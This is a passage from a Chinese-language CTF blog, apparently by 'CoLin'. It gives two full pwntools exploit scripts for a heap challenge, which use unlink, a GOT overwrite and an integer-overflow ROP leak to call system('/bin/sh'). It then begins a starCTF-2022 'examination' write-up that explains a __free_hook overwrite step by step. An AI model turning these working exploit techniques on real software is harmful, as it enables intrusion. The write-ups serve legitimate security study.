class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./ctflibc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>)</span><br><span class="line">libc_atoi_addr = libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">libc_sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_atoi_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_sys_addr))</span><br><span class="line"></span><br><span class="line">chunk_addr_bss = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;111.200.241.244&#x27;, 54585)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, index, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input cun\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Input content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Chose one to dele\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Chose one to edit\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Input the content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400C8C</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400DA3</span></span><br><span class="line">one_gadget_addr = <span class="number">0x41EBC</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">0</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">1</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)		<span class="comment"># fake chunk prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># fake chunk size</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x18</span>)	<span class="comment"># fake chunk fd</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x10</span>)	<span class="comment"># fake chunk_bk</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span>	<span class="comment"># useless filling data</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># front chunk prev_size (modified)</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># front size (modified)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x410</span>	<span class="comment"># useless filling data for front chunk</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># fake front-front chunk prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># fake front-front chunk size with prev_inuse = true</span></span><br><span class="line">create(<span class="number">0x860</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)				<span class="comment"># trigger unlink_chunk(av, p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the address of chunk_0 (0x6020e0) has been changed into 0x6020c8, we can edit the next chunk into .got.plt</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span>	<span class="comment"># useless data for filling</span></span><br><span class="line">payload += p64(<span class="number">0x6020c8</span>)	<span class="comment"># chunk_0 address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># chunk_0 inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602018</span>)	<span class="comment"># change the chunk_1 to .got.plt of free()</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># change chunk_1 into inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602028</span>)	<span class="comment"># the .got.plt of write, ready to be used to get libc loading address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># set the chunk_2 into inuse for free()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))		<span class="comment"># change the address, now free() equals puts()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">mem_write_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)	<span class="comment"># get the write() address in memory</span></span><br><span class="line">libc_base = mem_write_addr - libc_write_addr	<span class="comment"># libc loading base</span></span><br><span class="line">mem_sys_addr = libc_base + libc_sys_addr		<span class="comment"># system() address in memory</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(mem_sys_addr))			<span class="comment"># now free() equals system()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="number">3</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>当然，本着学习的态度，我们可以思考一下，除了这种方法还有没有其他的方法呢？在发布wp点赞第一的文章中，我看到了对整型溢出的利用。上面的方法不需要整型溢出就可以实现，而整型溢出为我们提供了另外一种获取libc加载地址的方法。</p>
<p>由于本程序没有canary，如果我们将size写成负数，就可以在栈上实现溢出。但是这里我有一点不太清楚：如果将size写为负数，那么malloc注定失败返回空指针。在将content写入栈时，dest的值仍然是0，为什么不会报段错误？在进行gdb调试时，read函数检测到size为-1时根本就不会中断等待输入，而在脚本中我们强制传过去了一段内容，不知这样会对程序产生什么样的影响，但memcpy这个函数注定是不会执行了。总之这种方式是有效的，使用ROP获取到了puts函数的got表地址。</p>
<p>之后还是通过unlink，只不过直接修改free的地址即可。</p>
<p>payload: （本payload在Kali上测试成功，libc版本：Debian GLIBC 2.33-6，2022/4/5最新更新版本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./ctflibc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>)</span><br><span class="line">libc_atoi_addr = libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">libc_sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_atoi_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_sys_addr))</span><br><span class="line"></span><br><span class="line">chunk_addr_bss = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;111.200.241.244&#x27;, 54585)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, index, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input cun\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Input content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Chose one to dele\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Chose one to edit\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Input the content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400C8C</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400DA3</span></span><br><span class="line">one_gadget_addr = <span class="number">0x41EBC</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>		<span class="comment"># the dest address, not matter</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>		<span class="comment"># not to change the index</span></span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)		<span class="comment"># size</span></span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])	<span class="comment"># pop the address of .got.plt(puts) to rdi</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(main_addr)		<span class="comment"># return to start address of main</span></span><br><span class="line"></span><br><span class="line">create(-<span class="number">1</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">mem_puts_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = mem_puts_addr - libc_puts_addr</span><br><span class="line">mem_sys_addr = libc_base + libc_sys_addr</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">0</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">1</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)		<span class="comment"># fake chunk prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># fake chunk size</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x18</span>)	<span class="comment"># fake chunk fd</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x10</span>)	<span class="comment"># fake chunk_bk</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span>	<span class="comment"># useless filling data</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># front chunk prev_size (modified)</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># front size (modified)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x410</span>	<span class="comment"># useless filling data for front chunk</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)	<span class="comment"># fake front-front chunk prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># fake front-front chunk size with prev_inuse = true</span></span><br><span class="line">create(<span class="number">0x860</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)				<span class="comment"># trigger unlink_chunk(av, p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the address of chunk_0 (0x6020e0) has been changed into 0x6020c8, we can edit the next chunk into .got.plt</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span>	<span class="comment"># useless data for filling</span></span><br><span class="line">payload += p64(<span class="number">0x6020c8</span>)	<span class="comment"># chunk_0 address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># chunk_0 inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602018</span>)	<span class="comment"># change the chunk_1 to .got.plt of free()</span></span><br><span class="line">payload += p64(<span class="number">1</span>)			<span class="comment"># change chunk_1 into inuse</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(mem_sys_addr))		<span class="comment"># change the address, now free() equals system()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="number">2</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>以上就是适用于目前最新版本libc的两种解题方案。如果版本比较老还可以考虑使用fastbin的double_free，但是考虑到目前比赛使用的glibc版本越来越高，这里只分析这两种方法。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">starCTF-2022 examination 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:47:23" itemprop="dateCreated datePublished" datetime="2023-02-28T22:47:23+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-02 16:32:56" itemprop="dateModified" datetime="2023-03-02T16:32:56+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>这是一道堆题，模拟了学生和老师的有趣生活。</p>
<p>在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。</p>
<p>首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。</p>
<p><img src="1.png" alt="" /></p>
<p>在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。</p>
<p>但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。</p>
<p>经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。</p>
<p><strong>1. 学生数量问题</strong></p>
<p><img src="2.png" alt="" /></p>
<p>从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。</p>
<p><strong>2. 评分问题</strong></p>
<p><img src="3.png" alt="" /></p>
<p>在评分的函数中，我们发现了一个程序bug。</p>
<p>假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。</p>
<p><strong>3. 地址写</strong></p>
<p><img src="4.png" alt="" /></p>
<p>在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。<s>（屑出题人）</s></p>
<p><strong>4. calloc</strong></p>
<p>本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。</p>
<p>注意到上面的限制条件之后，我们可以对步骤细化：</p>
<p>Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查<br />
Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置<br />
Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）<br />
Step 4: 删除学生6<br />
Step 5: 读取学生5评语获取libc地址<br />
Step 6: 将学生6添加回来<br />
Step 7: 用学生5覆写学生6的chunk指针到__free_hook<br />
Step 8: 为学生6写评语’/bin/sh’<br />
Step 9: 在__free_hook写入system地址<br />
Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置<br />
Step 11: 删除学生6，getshell</p>
<p>这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。</p>
<p>在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：</p>
<p>在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：</p>
<p><img src="5.png" alt="" /><br />
在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。</p>
<p><img src="6.png" alt="" /></p>
<p>由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：</p>
<p><img src="7.png" alt="" /></p>
<p>这两个假chunk可用于绕过_int_free函数的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4316</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// line 4320</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在此之后，将学生5的comment chunk指针改到学生6的comment chunk可写头部，将学生6的comment chunk改大0x100后释放。</p>
<p><img src="8.png" alt="" /></p>
<p>此时，我们使用stu5的指针可以获取到stu6 comment chunk的libc地址，因为此时这个chunk大小为0x500，在unsorted bin中。<br />
之后将stu6申请回来，由于calloc不会使用tcache，因此在comment chunks上方被释放到tcache中原stu6的pointer chunk和header chunk均不会被分配出来，而是会对stu6的comment chunk进行切割，从而也就能够使我们能通过stu5的指针对stu6的信息进行随意改写。我们先对stu6写评语：‘/bin/sh’，这个地址我们可以得到，就在stu6的header chunk之上，我们首先将计算得到的__free_hook地址写到stu6的header chunk中存放comment chunk指针的地方，这样可以在对stu6写评语时直接修改__free_hook的值。然后再对stu5写评语将stu6的comment chunk指针改回到原先写有’/bin/sh’的地方，再执行free函数即可getshell。</p>
<p><img src="9.png" alt="" /></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 